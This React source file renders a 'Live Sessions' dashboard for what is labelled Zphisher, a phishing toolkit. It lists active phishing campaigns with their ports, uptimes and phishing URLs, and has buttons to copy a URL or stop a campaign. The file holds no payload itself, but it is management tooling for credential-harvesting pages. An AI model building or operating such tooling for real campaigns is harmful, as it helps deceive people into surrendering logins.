import { AppLayout } from "@/components/layout/AppLayout";
import { useListSessions, useStopCampaign, getListSessionsQueryKey } from "@workspace/api-client-react";
import { Terminal, Square, Radio, Copy } from "lucide-react";
import { formatDate, copyToClipboard } from "@/lib/utils";
import { useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { Link } from "wouter";

export default function SessionsList() {
  const { data: sessions, isLoading } = useListSessions();
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const stopMutation = useStopCampaign({
    mutation: {
      onSuccess: () => {
        toast({ title: "Session Killed", description: "The active session was terminated." });
        queryClient.invalidateQueries({ queryKey: getListSessionsQueryKey() });
      }
    }
  });

  return (
    <AppLayout 
      title="Live Sessions" 
      description="Monitor and control active running tunnels."
    >
      <div className="bg-black border border-green-500/30 rounded-xl overflow-hidden shadow-[0_0_30px_rgba(0,255,0,0.05)] relative">
        <div className="scanline" />
        
        <div className="p-3 border-b border-green-500/30 bg-green-500/5 flex items-center gap-3 relative z-10">
          <Terminal className="w-4 h-4 text-green-400" />
          <span className="font-mono text-xs text-green-400 uppercase tracking-widest font-bold">Zphisher Core :: Active Tunnels</span>
        </div>

        <div className="p-6 font-mono text-sm relative z-10 min-h-[400px]">
          {isLoading ? (
            <div className="text-green-500/50 animate-pulse">&gt; Analyzing network interfaces...</div>
          ) : sessions?.length === 0 ? (
            <div className="text-muted-foreground">
              <p>&gt; Connection established.</p>
              <p className="mt-2 text-yellow-500/70">&gt; Warning: No active tunnels detected.</p>
            </div>
          ) : (
            <div className="space-y-6">
              <p className="text-muted-foreground">&gt; Detected {sessions?.length} active connection(s):</p>
              
              {sessions?.map(s => (
                <div key={s.id} className="border border-green-500/20 bg-green-500/5 p-4 rounded-md">
                  <div className="flex justify-between items-start mb-3">
                    <div className="flex items-center gap-2">
                      <Radio className="w-4 h-4 text-green-400 animate-pulse" />
                      <span className="text-green-400 font-bold">PID:{s.id}</span>
                      <Link href={`/campaigns/${s.campaignId}`} className="text-white hover:underline ml-2">
                        [{s.campaignName}]
                      </Link>
                    </div>
                    <button 
                      onClick={() => stopMutation.mutate({ id: s.campaignId })}
                      disabled={stopMutation.isPending}
                      className="px-3 py-1 bg-red-500/20 text-red-400 border border-red-500/30 rounded text-xs hover:bg-red-500/40 transition-colors flex items-center gap-1 uppercase disabled:opacity-50"
                    >
                      <Square className="w-3 h-3 fill-current" /> Kill
                    </button>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-xs">
                    <div>
                      <span className="text-muted-foreground mr-2">Uptime:</span> 
                      <span className="text-white">{formatDate(s.startedAt)}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground mr-2">Port:</span> 
                      <span className="text-cyan-400">{s.port}</span>
                    </div>
                    <div className="col-span-1 md:col-span-2 flex items-center gap-2 mt-2">
                      <span className="text-muted-foreground mr-2">Host:</span> 
                      <span className="text-blue-400 underline truncate max-w-md">{s.phishUrl}</span>
                      <button onClick={() => { copyToClipboard(s.phishUrl); toast({title:"Copied"}); }} className="text-muted-foreground hover:text-white ml-2">
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </AppLayout>
  );
}
